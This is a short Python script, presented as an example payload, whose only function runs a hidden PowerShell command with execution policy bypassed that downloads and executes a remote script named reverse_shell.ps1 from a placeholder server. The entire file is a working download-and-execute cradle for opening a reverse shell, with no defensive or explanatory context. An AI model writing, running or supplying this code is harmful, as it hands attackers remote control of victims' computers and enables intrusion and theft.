import os
import subprocess

def main():
    # Example payload: Open a reverse shell
    os.system('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object System.Net.WebClient).DownloadString(\'http://your-server.com/reverse_shell.ps1\')"')

if __name__ == "__main__":
    main()